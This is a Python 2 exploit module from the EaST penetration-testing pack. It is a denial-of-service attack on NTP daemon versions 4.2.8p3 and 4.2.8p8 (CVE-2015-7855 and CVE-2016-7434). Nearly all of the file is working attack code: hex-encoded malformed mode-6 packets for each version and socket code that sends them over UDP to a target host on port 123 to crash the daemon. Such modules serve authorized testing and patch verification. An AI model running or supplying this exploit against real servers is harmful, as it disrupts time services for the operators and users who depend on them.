#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

import socket
from core.Sploit import Sploit

INFO = {}
INFO['NAME'] = 'ntp_428_p3_p8_dos'
INFO['DESCRIPTION'] = 'NTP 4.2.8p[3, 8] Denial Of Service'
INFO['VENDOR'] = 'http://www.ntp.org/'
INFO['CVE Name'] = '2015-7855'
INFO['NOTES'] = '''
Version p3: All ntp-4 releases up to, but not including 4.2.8p4,
and 4.3.0 up to, but not including 4.3.77. CVE-2015-7855.
Version p8: ntp-4.2.7p22, up to but not including ntp-4.2.8p9,
and ntp-4.3.0 up to, but not including ntp-4.3.94. CVE-2016-7434.
'''
INFO['LINKS'] = [
    'https://www.exploit-db.com/exploits/40840/',
    'https://www.exploit-db.com/exploits/40806/'
]
INFO['AUTHOR'] = 'Magnus Klaaborg Stubman (@magnusstubman)'

INFO['CHANGELOG'] = '05 Dec, 2016. Written by Gleg team.'
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '192.168.153.132'
OPTIONS['PORT'] = 123
OPTIONS['VERSION'] = dict(options=['4.2.8p3', '4.2.8p8'], selected='4.2.8p3')


class exploit(Sploit):
    def __init__(self, logger=None):
        Sploit.__init__(self, logger=logger, options=OPTIONS)
        self.name = INFO['NAME']
        self.state = 'running'
        return

    def exploit(self):
        if 'p3' in self.version:
            payload = '\x16\x0a\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa0\x6e'
            payload += '\x6f\x6e\x63\x65\x3d\x64\x61\x33\x64\x35\x64\x30\x66'
            payload += '\x66\x38\x30\x38\x31\x65\x63\x38\x33\x35\x32\x61\x32'
            payload += '\x32\x38\x36\x2c\x20\x66\x72\x61\x67\x73\x3d\x33\x32'
            payload += '\x2c\x20\x6c\x61\x64\x64\x72\x3d\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39\x39'
            payload += '\x39\x39\x39'
        elif 'p8' in self.version:
            payload = '\x16\x0a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x36\x6e'
            payload += '\x6f\x6e\x63\x65\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b'
            payload += '\x5d\x3a\x48\x72\x61\x67\x73\x3d\x33\x32\x2c\x20\x6c'
            payload += '\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x32'
            payload += '\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f'
            payload += '\x50\x00\x00'
        else:
            self.log('Incorrect version of ntp')
            return False
        self.log('Sending payload to ' + self.host + ':' + str(self.port))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (self.host, int(self.port)))
        self.log('Done!')
        self.log('payload sent, check your ntp daemon...')
        return True

    def run(self):
        if self.exploit():
            self.finish(True)
            return 1
        else:
            self.finish(False)
            return 0


if __name__ == '__main__':
    '''
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    '''
    print 'Running exploit %s .. ' % INFO['NAME']
    exp = exploit()
    exp.run()
